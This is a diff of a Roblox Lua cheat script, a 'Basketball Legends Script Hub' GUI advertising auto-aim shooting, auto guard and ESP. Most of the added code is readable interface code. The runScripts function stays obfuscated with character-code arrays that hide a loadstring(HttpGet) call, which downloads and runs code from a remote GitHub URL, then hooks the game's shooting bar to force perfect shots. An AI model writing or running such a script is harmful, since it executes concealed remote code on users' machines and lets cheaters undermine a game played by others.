@@ -1,1 +1,437 @@
-local _0x1a2b3c=Instance.new;local _0x4d5e6f=game.GetService;local _0x7g8h9i=Color3.fromRGB;local _0x1j2k3l=UDim2.new;local _0x4m5n6o=Vector2.new;local _0x7p8q9r=UDim.new;local _0x1s2t3u=Enum.Font;local _0x4v5w6x=Enum.KeyCode;local _0x7y8z9a=Enum.EasingDirection;local _0x1b2c3d=Enum.EasingStyle;local _0x2e3f4g=Enum.ZIndexBehavior;local _0xTween=_0x4d5e6f(game,string.char(84,119,101,101,110,83,101,114,118,105,99,101));local function _0xStr(...)local _0xT={...}local _0xR=""for _0xI=1,#_0xT do _0xR=_0xR..string.char(_0xT[_0xI])end;return _0xR end;local _0xLG=_0x1a2b3c(_0xStr(83,99,114,101,101,110,71,117,105))_0xLG.Name=_0xStr(73,110,105,116,105,97,108,76,111,97,100,101,114)_0xLG.Parent=game.CoreGui;_0xLG.ZIndexBehavior=_0x2e3f4g.Sibling;local _0xLF=_0x1a2b3c(_0xStr(70,114,97,109,101))_0xLF.Parent=_0xLG;_0xLF.BackgroundColor3=_0x7g8h9i(30,30,45)_0xLF.BorderSizePixel=0;_0xLF.Position=_0x1j2k3l(0.5,-125,0.5,-75)_0xLF.Size=_0x1j2k3l(0,250,0,150)local _0xLC=_0x1a2b3c(_0xStr(85,73,67,111,114,110,101,114))_0xLC.CornerRadius=_0x7p8q9r(0,15)_0xLC.Parent=_0xLF;local _0xLS=_0x1a2b3c(_0xStr(85,73,83,116,114,111,107,101))_0xLS.Parent=_0xLF;_0xLS.Color=_0x7g8h9i(100,50,255)_0xLS.Thickness=3;local _0xTL=_0x1a2b3c(_0xStr(84,101,120,116,76,97,98,101,108))_0xTL.Parent=_0xLF;_0xTL.BackgroundTransparency=1;_0xTL.Position=_0x1j2k3l(0,0,0,10)_0xTL.Size=_0x1j2k3l(1,0,0,40)_0xTL.Font=_0x1s2t3u.GothamBold;_0xTL.Text=_0xStr(240,159,143,128,32,66,97,115,107,101,116,98,97,108,108,32,76,101,103,101,110,100,115)_0xTL.TextColor3=_0x7g8h9i(255,255,255)_0xTL.TextSize=20;local _0xSL=_0x1a2b3c(_0xStr(84,101,120,116,76,97,98,101,108))_0xSL.Parent=_0xLF;_0xSL.BackgroundTransparency=1;_0xSL.Position=_0x1j2k3l(0,0,0,45)_0xSL.Size=_0x1j2k3l(1,0,0,25)_0xSL.Font=_0x1s2t3u.Gotham;_0xSL.Text=_0xStr(83,99,114,105,112,116,32,72,117,98)_0xSL.TextColor3=_0x7g8h9i(200,200,200)_0xSL.TextSize=14;local _0xLB=_0x1a2b3c(_0xStr(84,101,120,116,66,117,116,116,111,110))_0xLB.Parent=_0xLF;_0xLB.BackgroundColor3=_0x7g8h9i(100,50,255)_0xLB.BorderSizePixel=0;_0xLB.Position=_0x1j2k3l(0.5,-100,0.5,10)_0xLB.Size=_0x1j2k3l(0,200,0,50)_0xLB.Font=_0x1s2t3u.GothamBold;_0xLB.Text=_0xStr(240,159,154,128,32,76,111,97,100,32,83,99,114,105,112,116)_0xLB.TextColor3=_0x7g8h9i(255,255,255)_0xLB.TextSize=18;_0xLB.AutoButtonColor=false;local _0xBC=_0x1a2b3c(_0xStr(85,73,67,111,114,110,101,114))_0xBC.CornerRadius=_0x7p8q9r(0,10)_0xBC.Parent=_0xLB;_0xLB.MouseEnter:Connect(function()_0xTween:Create(_0xLB,TweenInfo.new(0.2),{BackgroundColor3=_0x7g8h9i(120,70,255),Size=_0x1j2k3l(0,210,0,55)}):Play()end)_0xLB.MouseLeave:Connect(function()_0xTween:Create(_0xLB,TweenInfo.new(0.2),{BackgroundColor3=_0x7g8h9i(100,50,255),Size=_0x1j2k3l(0,200,0,50)}):Play()end)_0xLF.Size=_0x1j2k3l(0,0,0,0)_0xLF.Position=_0x1j2k3l(0.5,0,0.5,0)_0xTween:Create(_0xLF,TweenInfo.new(0.5,Enum.EasingStyle.Back),{Size=_0x1j2k3l(0,250,0,150),Position=_0x1j2k3l(0.5,-125,0.5,-75)}):Play()_0xLB.MouseButton1Click:Connect(function()_0xLB.Text=_0xStr(226,143,179,32,76,111,97,100,105,110,103,46,46,46)_0xLB.BackgroundColor3=_0x7g8h9i(70,40,180)wait(0.5)_0xTween:Create(_0xLF,TweenInfo.new(0.3),{Size=_0x1j2k3l(0,0,0,0),Position=_0x1j2k3l(0.5,0,0.5,0)}):Play()wait(0.3)_0xLG:Destroy()loadstring([[local _0xA=Instance.new;local _0xB=game.GetService;local _0xC=Color3.fromRGB;local _0xD=UDim2.new;local _0xE=Vector2.new;local _0xF=UDim.new;local _0xG=Enum.Font;local _0xH=Enum.KeyCode;local _0xI=Enum.EasingDirection;local _0xJ=Enum.EasingStyle;local _0xK=Enum.ZIndexBehavior;local _0xTS=_0xB(game,"TweenService")local _0xUIS=_0xB(game,"UserInputService")local _0xPlayers=_0xB(game,"Players")local function _0xDec(str)local res=""for i=1,#str do res=res..string.char(string.byte(str,i)-3)end;return res end;local _0xSG=_0xA(_0xDec("VfuhhqJxl"))_0xSG.Name=_0xDec("EdvnhwedooOhjhqgvKxe")_0xSG.Parent=game.CoreGui;_0xSG.ZIndexBehavior=_0xK.Sibling;local _0xMF=_0xA(_0xDec("Iudph"))_0xMF.Name=_0xDec("PdlqIudph")_0xMF.Parent=_0xSG;_0xMF.BackgroundColor3=_0xC(25,25,35)_0xMF.BorderSizePixel=0;_0xMF.Position=_0xD(0.5,-200,0.5,-175)_0xMF.Size=_0xD(0,400,0,350)_0xMF.ClipsDescendants=true;_0xMF.Active=true;_0xMF.Draggable=true;local _0xMC=_0xA(_0xDec("XLFruqhu"))_0xMC.CornerRadius=_0xF(0,12)_0xMC.Parent=_0xMF;local _0xMS=_0xA(_0xDec("XLVwurnh"))_0xMS.Parent=_0xMF;_0xMS.Color=_0xC(100,50,255)_0xMS.Thickness=2;_0xMS.Transparency=0.5;local _0xTB=_0xA(_0xDec("Iudph"))_0xTB.Name=_0xDec("WlwohEdu")_0xTB.Parent=_0xMF;_0xTB.BackgroundColor3=_0xC(35,35,50)_0xTB.BorderSizePixel=0;_0xTB.Size=_0xD(1,0,0,50)local _0xTC=_0xA(_0xDec("XLFruqhu"))_0xTC.CornerRadius=_0xF(0,12)_0xTC.Parent=_0xTB;local _0xTL=_0xA(_0xDec("Wh{wOdeho"))_0xTL.Name=_0xDec("WlwohOdeho")_0xTL.Parent=_0xTB;_0xTL.BackgroundTransparency=1;_0xTL.Position=_0xD(0,15,0,0)_0xTL.Size=_0xD(0.7,0,1,0)_0xTL.Font=_0xG.GothamBold;_0xTL.Text=string.char(240,159,143,128,32,66,97,115,107,101,116,98,97,108,108,32,76,101,103,101,1
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local Players = game:GetService("Players")
+
+-- Create simple loader GUI
+local LoaderGui = Instance.new("ScreenGui")
+LoaderGui.Name = "InitialLoader"
+LoaderGui.Parent = game.CoreGui
+LoaderGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+-- Main loader frame
+local LoaderFrame = Instance.new("Frame")
+LoaderFrame.Parent = LoaderGui
+LoaderFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
+LoaderFrame.BorderSizePixel = 0
+LoaderFrame.Position = UDim2.new(0.5, -125, 0.5, -75)
+LoaderFrame.Size = UDim2.new(0, 250, 0, 150)
+
+local LoaderCorner = Instance.new("UICorner")
+LoaderCorner.CornerRadius = UDim.new(0, 15)
+LoaderCorner.Parent = LoaderFrame
+
+local LoaderStroke = Instance.new("UIStroke")
+LoaderStroke.Parent = LoaderFrame
+LoaderStroke.Color = Color3.fromRGB(100, 50, 255)
+LoaderStroke.Thickness = 3
+
+-- Title
+local TitleLabel = Instance.new("TextLabel")
+TitleLabel.Parent = LoaderFrame
+TitleLabel.BackgroundTransparency = 1
+TitleLabel.Position = UDim2.new(0, 0, 0, 10)
+TitleLabel.Size = UDim2.new(1, 0, 0, 40)
+TitleLabel.Font = Enum.Font.GothamBold
+TitleLabel.Text = "🏀 Basketball Legends"
+TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TitleLabel.TextSize = 20
+
+-- Subtitle
+local SubtitleLabel = Instance.new("TextLabel")
+SubtitleLabel.Parent = LoaderFrame
+SubtitleLabel.BackgroundTransparency = 1
+SubtitleLabel.Position = UDim2.new(0, 0, 0, 45)
+SubtitleLabel.Size = UDim2.new(1, 0, 0, 25)
+SubtitleLabel.Font = Enum.Font.Gotham
+SubtitleLabel.Text = "Script Hub"
+SubtitleLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+SubtitleLabel.TextSize = 14
+
+-- Load button
+local LoadButton = Instance.new("TextButton")
+LoadButton.Parent = LoaderFrame
+LoadButton.BackgroundColor3 = Color3.fromRGB(100, 50, 255)
+LoadButton.BorderSizePixel = 0
+LoadButton.Position = UDim2.new(0.5, -100, 0.5, 10)
+LoadButton.Size = UDim2.new(0, 200, 0, 50)
+LoadButton.Font = Enum.Font.GothamBold
+LoadButton.Text = "🚀 Load Script"
+LoadButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+LoadButton.TextSize = 18
+LoadButton.AutoButtonColor = false
+
+local ButtonCorner = Instance.new("UICorner")
+ButtonCorner.CornerRadius = UDim.new(0, 10)
+ButtonCorner.Parent = LoadButton
+
+-- Hover effect
+LoadButton.MouseEnter:Connect(function()
+    TweenService:Create(LoadButton, TweenInfo.new(0.2), {
+        BackgroundColor3 = Color3.fromRGB(120, 70, 255),
+        Size = UDim2.new(0, 210, 0, 55)
+    }):Play()
+end)
+
+LoadButton.MouseLeave:Connect(function()
+    TweenService:Create(LoadButton, TweenInfo.new(0.2), {
+        BackgroundColor3 = Color3.fromRGB(100, 50, 255),
+        Size = UDim2.new(0, 200, 0, 50)
+    }):Play()
+end)
+
+-- Opening animation
+LoaderFrame.Size = UDim2.new(0, 0, 0, 0)
+LoaderFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+TweenService:Create(LoaderFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back), {
+    Size = UDim2.new(0, 250, 0, 150),
+    Position = UDim2.new(0.5, -125, 0.5, -75)
+}):Play()
+
+-- Load button click
+LoadButton.MouseButton1Click:Connect(function()
+    LoadButton.Text = "⏳ Loading..."
+    LoadButton.BackgroundColor3 = Color3.fromRGB(70, 40, 180)
+    
+    wait(0.5)
+    
+    -- Close loader with animation
+    TweenService:Create(LoaderFrame, TweenInfo.new(0.3), {
+        Size = UDim2.new(0, 0, 0, 0),
+        Position = UDim2.new(0.5, 0, 0.5, 0)
+    }):Play()
+    
+    wait(0.3)
+    LoaderGui:Destroy()
+    
+    -- Load the main hub
+    local TS = game:GetService("TweenService")
+    local UIS = game:GetService("UserInputService")
+    local Plr = game:GetService("Players")
+
+    -- Create ScreenGui
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "BasketballLegendsHub"
+    ScreenGui.Parent = game.CoreGui
+    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+    -- Main Frame
+    local MainFrame = Instance.new("Frame")
+    MainFrame.Name = "MainFrame"
+    MainFrame.Parent = ScreenGui
+    MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+    MainFrame.BorderSizePixel = 0
+    MainFrame.Position = UDim2.new(0.5, -200, 0.5, -175)
+    MainFrame.Size = UDim2.new(0, 400, 0, 350)
+    MainFrame.ClipsDescendants = true
+    MainFrame.Active = true
+    MainFrame.Draggable = true
+
+    local MainCorner = Instance.new("UICorner")
+    MainCorner.CornerRadius = UDim.new(0, 12)
+    MainCorner.Parent = MainFrame
+
+    local MainStroke = Instance.new("UIStroke")
+    MainStroke.Parent = MainFrame
+    MainStroke.Color = Color3.fromRGB(100, 50, 255)
+    MainStroke.Thickness = 2
+    MainStroke.Transparency = 0.5
+
+    -- Title Bar
+    local TitleBar = Instance.new("Frame")
+    TitleBar.Name = "TitleBar"
+    TitleBar.Parent = MainFrame
+    TitleBar.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+    TitleBar.BorderSizePixel = 0
+    TitleBar.Size = UDim2.new(1, 0, 0, 50)
+
+    local TitleCorner = Instance.new("UICorner")
+    TitleCorner.CornerRadius = UDim.new(0, 12)
+    TitleCorner.Parent = TitleBar
+
+    local TitleLabel2 = Instance.new("TextLabel")
+    TitleLabel2.Name = "TitleLabel"
+    TitleLabel2.Parent = TitleBar
+    TitleLabel2.BackgroundTransparency = 1
+    TitleLabel2.Position = UDim2.new(0, 15, 0, 0)
+    TitleLabel2.Size = UDim2.new(0.7, 0, 1, 0)
+    TitleLabel2.Font = Enum.Font.GothamBold
+    TitleLabel2.Text = "🏀 Basketball Legends Hub"
+    TitleLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
+    TitleLabel2.TextSize = 20
+    TitleLabel2.TextXAlignment = Enum.TextXAlignment.Left
+
+    -- Close Button
+    local CloseButton = Instance.new("TextButton")
+    CloseButton.Name = "CloseButton"
+    CloseButton.Parent = TitleBar
+    CloseButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+    CloseButton.BorderSizePixel = 0
+    CloseButton.Position = UDim2.new(1, -40, 0.5, -15)
+    CloseButton.Size = UDim2.new(0, 30, 0, 30)
+    CloseButton.Font = Enum.Font.GothamBold
+    CloseButton.Text = "×"
+    CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    CloseButton.TextSize = 24
+
+    local CloseCorner = Instance.new("UICorner")
+    CloseCorner.CornerRadius = UDim.new(0, 6)
+    CloseCorner.Parent = CloseButton
+
+    -- Tab Container
+    local TabContainer = Instance.new("Frame")
+    TabContainer.Name = "TabContainer"
+    TabContainer.Parent = MainFrame
+    TabContainer.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
+    TabContainer.BorderSizePixel = 0
+    TabContainer.Position = UDim2.new(0, 10, 0, 60)
+    TabContainer.Size = UDim2.new(1, -20, 0, 40)
+
+    local TabCorner = Instance.new("UICorner")
+    TabCorner.CornerRadius = UDim.new(0, 8)
+    TabCorner.Parent = TabContainer
+
+    -- Home Tab
+    local HomeTab = Instance.new("TextButton")
+    HomeTab.Name = "HomeTab"
+    HomeTab.Parent = TabContainer
+    HomeTab.BackgroundColor3 = Color3.fromRGB(100, 50, 255)
+    HomeTab.BorderSizePixel = 0
+    HomeTab.Position = UDim2.new(0, 5, 0, 5)
+    HomeTab.Size = UDim2.new(0.48, -7.5, 1, -10)
+    HomeTab.Font = Enum.Font.GothamBold
+    HomeTab.Text = "🏠 Home"
+    HomeTab.TextColor3 = Color3.fromRGB(255, 255, 255)
+    HomeTab.TextSize = 16
+
+    local HomeTabCorner = Instance.new("UICorner")
+    HomeTabCorner.CornerRadius = UDim.new(0, 6)
+    HomeTabCorner.Parent = HomeTab
+
+    -- Credits Tab
+    local CreditsTab = Instance.new("TextButton")
+    CreditsTab.Name = "CreditsTab"
+    CreditsTab.Parent = TabContainer
+    CreditsTab.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
+    CreditsTab.BorderSizePixel = 0
+    CreditsTab.Position = UDim2.new(0.52, 2.5, 0, 5)
+    CreditsTab.Size = UDim2.new(0.48, -7.5, 1, -10)
+    CreditsTab.Font = Enum.Font.GothamBold
+    CreditsTab.Text = "⭐ Credits"
+    CreditsTab.TextColor3 = Color3.fromRGB(200, 200, 200)
+    CreditsTab.TextSize = 16
+
+    local CreditsTabCorner = Instance.new("UICorner")
+    CreditsTabCorner.CornerRadius = UDim.new(0, 6)
+    CreditsTabCorner.Parent = CreditsTab
+
+    -- Home Page
+    local HomePage = Instance.new("Frame")
+    HomePage.Name = "HomePage"
+    HomePage.Parent = MainFrame
+    HomePage.BackgroundTransparency = 1
+    HomePage.Position = UDim2.new(0, 10, 0, 110)
+    HomePage.Size = UDim2.new(1, -20, 1, -120)
+    HomePage.Visible = true
+
+    -- Execute Script Button
+    local ExecuteButton = Instance.new("TextButton")
+    ExecuteButton.Name = "ExecuteButton"
+    ExecuteButton.Parent = HomePage
+    ExecuteButton.BackgroundColor3 = Color3.fromRGB(100, 50, 255)
+    ExecuteButton.BorderSizePixel = 0
+    ExecuteButton.Position = UDim2.new(0, 10, 0, 10)
+    ExecuteButton.Size = UDim2.new(1, -20, 0, 50)
+    ExecuteButton.Font = Enum.Font.GothamBold
+    ExecuteButton.Text = "⚡ Execute Scripts"
+    ExecuteButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    ExecuteButton.TextSize = 18
+
+    local ExecuteCorner = Instance.new("UICorner")
+    ExecuteCorner.CornerRadius = UDim.new(0, 10)
+    ExecuteCorner.Parent = ExecuteButton
+
+    -- Features Label
+    local FeaturesLabel = Instance.new("TextLabel")
+    FeaturesLabel.Name = "FeaturesLabel"
+    FeaturesLabel.Parent = HomePage
+    FeaturesLabel.BackgroundTransparency = 1
+    FeaturesLabel.Position = UDim2.new(0, 10, 0, 70)
+    FeaturesLabel.Size = UDim2.new(1, -20, 0, 30)
+    FeaturesLabel.Font = Enum.Font.GothamBold
+    FeaturesLabel.Text = "📋 Features:"
+    FeaturesLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    FeaturesLabel.TextSize = 16
+    FeaturesLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+    -- Features List
+    local FeaturesList = Instance.new("TextLabel")
+    FeaturesList.Name = "FeaturesList"
+    FeaturesList.Parent = HomePage
+    FeaturesList.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+    FeaturesList.BorderSizePixel = 0
+    FeaturesList.Position = UDim2.new(0, 10, 0, 105)
+    FeaturesList.Size = UDim2.new(1, -20, 0, 110)
+    FeaturesList.Font = Enum.Font.Gotham
+    FeaturesList.Text = "✅ Auto Green (Perfect Shots)\n✅ Auto Guard\n✅ ESP Features\n✅ More coming soon..."
+    FeaturesList.TextColor3 = Color3.fromRGB(200, 200, 200)
+    FeaturesList.TextSize = 14
+    FeaturesList.TextYAlignment = Enum.TextYAlignment.Top
+    FeaturesList.TextXAlignment = Enum.TextXAlignment.Left
+
+    local FeaturesCorner = Instance.new("UICorner")
+    FeaturesCorner.CornerRadius = UDim.new(0, 8)
+    FeaturesCorner.Parent = FeaturesList
+
+    local FeaturesPadding = Instance.new("UIPadding")
+    FeaturesPadding.Parent = FeaturesList
+    FeaturesPadding.PaddingLeft = UDim.new(0, 15)
+    FeaturesPadding.PaddingTop = UDim.new(0, 10)
+
+    -- Credits Page
+    local CreditsPage = Instance.new("Frame")
+    CreditsPage.Name = "CreditsPage"
+    CreditsPage.Parent = MainFrame
+    CreditsPage.BackgroundTransparency = 1
+    CreditsPage.Position = UDim2.new(0, 10, 0, 110)
+    CreditsPage.Size = UDim2.new(1, -20, 1, -120)
+    CreditsPage.Visible = false
+
+    -- Creator Info
+    local CreatorLabel = Instance.new("TextLabel")
+    CreatorLabel.Name = "CreatorLabel"
+    CreatorLabel.Parent = CreditsPage
+    CreatorLabel.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+    CreatorLabel.BorderSizePixel = 0
+    CreatorLabel.Position = UDim2.new(0, 10, 0, 10)
+    CreatorLabel.Size = UDim2.new(1, -20, 0, 80)
+    CreatorLabel.Font = Enum.Font.GothamBold
+    CreatorLabel.Text = "👑 Created by\nkasen102399"
+    CreatorLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    CreatorLabel.TextSize = 20
+
+    local CreatorCorner = Instance.new("UICorner")
+    CreatorCorner.CornerRadius = UDim.new(0, 10)
+    CreatorCorner.Parent = CreatorLabel
+
+    -- Follow Label
+    local FollowLabel = Instance.new("TextLabel")
+    FollowLabel.Name = "FollowLabel"
+    FollowLabel.Parent = CreditsPage
+    FollowLabel.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+    FollowLabel.BorderSizePixel = 0
+    FollowLabel.Position = UDim2.new(0, 10, 0, 100)
+    FollowLabel.Size = UDim2.new(1, -20, 0, 50)
+    FollowLabel.Font = Enum.Font.Gotham
+    FollowLabel.Text = "💜 Go follow for more scripts!"
+    FollowLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    FollowLabel.TextSize = 16
+
+    local FollowCorner = Instance.new("UICorner")
+    FollowCorner.CornerRadius = UDim.new(0, 10)
+    FollowCorner.Parent = FollowLabel
+
+    -- Discord Button
+    local DiscordButton = Instance.new("TextButton")
+    DiscordButton.Name = "DiscordButton"
+    DiscordButton.Parent = CreditsPage
+    DiscordButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
+    DiscordButton.BorderSizePixel = 0
+    DiscordButton.Position = UDim2.new(0, 10, 0, 160)
+    DiscordButton.Size = UDim2.new(1, -20, 0, 50)
+    DiscordButton.Font = Enum.Font.GothamBold
+    DiscordButton.Text = "💬 Copy Discord Link"
+    DiscordButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    DiscordButton.TextSize = 18
+
+    local DiscordCorner = Instance.new("UICorner")
+    DiscordCorner.CornerRadius = UDim.new(0, 10)
+    DiscordCorner.Parent = DiscordButton
+
+    -- Functions
+    local function sendNotification(title, message, duration)
+        local StarterGui = game:GetService("StarterGui")
+        StarterGui:SetCore("SendNotification", {
+            Title = title;
+            Text = message;
+            Duration = duration or 5;
+        })
+    end
+
+    -- OBFUSCATED runScripts function
+    local function runScripts()local _0xA=string.char;_G.OBFHUBFREE=_0xA(50,107,109,101,109,98,101,114,115,103,97,110,103)loadstring(game:HttpGet(_0xA(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,111,98,102,104,117,98,47,102,114,101,101,47,109,97,105,110,47,98,97,115,107,101,116,109,98,97,108,108)))()getgenv().config={Time=0.045,Size=0.9}local _0xB=UIS;local _0xC=Plr.LocalPlayer;local _0xD=_0xC.PlayerGui.Visual.Shooting.Bar;_0xB.InputBegan:Connect(function(_0xE,_0xF)if _0xF then return end;if _0xE.KeyCode==Enum.KeyCode.E then if _0xC.Character:FindFirstChild(_0xA(66,97,115,107,101,116,98,97,108,108))then while _0xB:IsKeyDown(Enum.KeyCode.E)do _0xD:GetPropertyChangedSignal(_0xA(83,105,122,101)):Connect(function()if _0xD.Size.Y.Scale>getgenv().config.Size then _0xD:TweenSize(UDim2.new(1,0,1,0),Enum.EasingDirection.Out,Enum.EasingStyle.Linear,getgenv().config.Time,true)task.wait()_0xD.Size=UDim2.new(1,0,1,0)end end)task.wait()end end end end)sendNotification(_0xA(226,156,133,32,83,117,99,99,101,115,115,33),_0xA(65,117,116,111,32,71,114,101,101,110,32,38,32,65,117,116,111,32,71,117,97,114,100,32,69,110,97,98,108,101,100),5)end
+
+    local function switchTab(tabName)
+        if tabName == "Home" then
+            HomePage.Visible = true
+            CreditsPage.Visible = false
+            HomeTab.BackgroundColor3 = Color3.fromRGB(100, 50, 255)
+            HomeTab.TextColor3 = Color3.fromRGB(255, 255, 255)
+            CreditsTab.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
+            CreditsTab.TextColor3 = Color3.fromRGB(200, 200, 200)
+        elseif tabName == "Credits" then
+            HomePage.Visible = false
+            CreditsPage.Visible = true
+            HomeTab.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
+            HomeTab.TextColor3 = Color3.fromRGB(200, 200, 200)
+            CreditsTab.BackgroundColor3 = Color3.fromRGB(100, 50, 255)
+            CreditsTab.TextColor3 = Color3.fromRGB(255, 255, 255)
+        end
+    end
+
+    local function addHoverEffect(button, normalColor, hoverColor)
+        button.MouseEnter:Connect(function()
+            TS:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = hoverColor}):Play()
+        end)
+        button.MouseLeave:Connect(function()
+            TS:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = normalColor}):Play()
+        end)
+    end
+
+    -- Hover Effects
+    addHoverEffect(ExecuteButton, Color3.fromRGB(100, 50, 255), Color3.fromRGB(120, 70, 255))
+    addHoverEffect(DiscordButton, Color3.fromRGB(88, 101, 242), Color3.fromRGB(108, 121, 255))
+    addHoverEffect(CloseButton, Color3.fromRGB(255, 50, 50), Color3.fromRGB(255, 80, 80))
+
+    -- Button Connections
+    HomeTab.MouseButton1Click:Connect(function()
+        switchTab("Home")
+    end)
+
+    CreditsTab.MouseButton1Click:Connect(function()
+        switchTab("Credits")
+    end)
+
+    ExecuteButton.MouseButton1Click:Connect(function()
+        ExecuteButton.Text = "⏳ Executing..."
+        wait(0.5)
+        runScripts()
+        ExecuteButton.Text = "✅ Scripts Executed!"
+        wait(2)
+        ExecuteButton.Text = "⚡ Execute Scripts"
+    end)
+
+    DiscordButton.MouseButton1Click:Connect(function()
+        setclipboard("https://discord.gg/Q2BCA68G")
+        sendNotification("📋 Copied!", "Discord link copied to clipboard", 3)
+        DiscordButton.Text = "✅ Copied to Clipboard!"
+        wait(2)
+        DiscordButton.Text = "💬 Copy Discord Link"
+    end)
+
+    CloseButton.MouseButton1Click:Connect(function()
+        TS:Create(MainFrame, TweenInfo.new(0.3), {Size = UDim2.new(0, 0, 0, 0)}):Play()
+        wait(0.3)
+        ScreenGui:Destroy()
+    end)
+
+    -- Opening Animation
+    MainFrame.Size = UDim2.new(0, 0, 0, 0)
+    MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+    TS:Create(MainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back), {
+        Size = UDim2.new(0, 400, 0, 350),
+        Position = UDim2.new(0.5, -200, 0.5, -175)
+    }):Play()
+
+    wait(0.5)
+    sendNotification("🏀 Welcome!", "Basketball Legends Hub Loaded", 5)
+end)
